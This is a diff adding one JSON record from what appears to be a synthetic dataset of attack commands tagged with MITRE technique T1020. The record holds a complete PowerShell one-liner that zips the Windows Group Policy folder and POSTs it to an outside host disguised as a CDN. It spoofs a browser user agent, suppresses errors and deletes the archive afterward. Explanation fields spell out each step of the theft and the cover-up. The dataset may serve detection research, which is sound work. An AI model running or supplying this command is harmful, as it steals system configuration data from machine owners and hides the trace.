@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$ProgressPreference='SilentlyContinue'; $zip=Join-Path $env:TEMP ('pol_'+(Get-Date -Format yyyyMMddHHmmss)+'.zip'); Compress-Archive -Path 'C:\\Windows\\System32\\GroupPolicy' -DestinationPath $zip -Force; Invoke-WebRequest -Uri 'https://img.example-cdn.net/push/policy' -Method Post -InFile $zip -ContentType 'application/zip' -Headers @{ 'User-Agent'='Mozilla/5.0'; 'Cache-Control'='no-cache' } -ErrorAction SilentlyContinue; Remove-Item $zip -Force",
+  "explanation": "Compresses local Group Policy artifacts and exfiltrates them via HTTPS POST to a remote collection endpoint.",
+  "rationale_steps": [
+    "Package Group Policy files that can reveal system constraints and scripts.",
+    "Transfer the archive using Invoke-WebRequest with neutral headers.",
+    "Suppress progress and erase temporary files afterward."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-ed594729-56ace5da",
+  "source_prompt_hash": "ed594729",
+  "timestamp_utc": "2025-09-30T09:16:21.768830Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
